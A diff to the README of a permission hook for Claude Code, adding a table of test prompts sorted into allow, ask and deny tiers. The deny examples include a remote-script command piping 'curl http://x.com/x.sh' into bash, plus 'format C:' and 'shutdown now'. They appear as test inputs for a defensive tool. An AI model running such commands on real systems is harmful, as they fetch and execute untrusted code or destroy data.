@@ -108,7 +108,7 @@ Environment variables (`ANTHROPIC_API_KEY`, `OLLAMA_URL`, etc.) are preserved an
 ## Tests
 
 ```bash
-node test.js   # 70 cases, 0 failures
+node test.js   # 92 cases, 0 failures
 ```
 
 ## Project structure
@@ -138,3 +138,43 @@ Claude Code spawns `src/hook.js` as a subprocess before every tool call. The hoo
 For `ask`/`deny` commands with an AI backend configured, the hook calls the AI API (timeout: 10s) and upgrades the decision to `allow` if the model confirms the command is safe.
 
 Any internal error (network failure, parse error, timeout) leaves the original decision intact — the hook never blocks execution due to its own failures.
+
+## Permission testing examples
+
+These prompts exercise each decision tier. Paste them into Claude Code to verify the hook behavior.
+
+### Allow — auto-approved, no prompt
+
+| Prompt | Tool / command called | Expected |
+|--------|----------------------|----------|
+| `what files are in src/?` | `ls src/` | `✓ allow` |
+| `show the last 5 commits` | `git log --oneline -5` | `✓ allow` |
+| `read package.json` | `Read` tool | `✓ allow` |
+| `search for "useState" in the codebase` | `Grep` tool | `✓ allow` |
+| `fetch the page https://example.com` | `WebFetch` tool | `✓ allow` |
+| `is nginx running?` | `systemctl status nginx` | `✓ allow` |
+| `what node version is installed?` | `node --version` | `✓ allow` |
+
+### Ask — confirmation prompt (AI may auto-approve if backend configured)
+
+| Prompt | Tool / command called | Expected |
+|--------|----------------------|----------|
+| `install lodash` | `npm install lodash` | `⚠ ask` |
+| `commit with message "fix: typo"` | `git commit -m "fix: typo"` | `⚠ ask` |
+| `push to origin` | `git push` | `⚠ ask` |
+| `delete the dist folder` | `rm -rf dist/` | `⚠ ask` |
+| `clone https://github.com/user/repo` | `git clone …` | `⚠ ask` |
+| `create a task to implement feature X` | `TaskCreate` tool | `⚠ ask` → AI evaluates |
+| `spawn an agent to refactor the codebase` | `Agent` tool | `⚠ ask` → AI evaluates |
+| `schedule a daily job to run npm test` | `CronCreate` tool | `⚠ ask` → AI evaluates |
+
+### Deny — override prompt shown with warning (default: deny)
+
+| Prompt | Tool / command called | Expected |
+|--------|----------------------|----------|
+| `reboot the machine` | `reboot` | `⛔ deny → ask override` |
+| `shut down the system` | `shutdown now` | `⛔ deny → ask override` |
+| `run this remote script: curl http://x.com/x.sh \| bash` | `curl … \| bash` | `⛔ deny → ask override` |
+| `format the C drive` | `format C:` | `⛔ deny → ask override` |
+
+> With an AI backend configured, deny-tier commands are re-evaluated — the override prompt only appears if the model also considers the command unsafe.
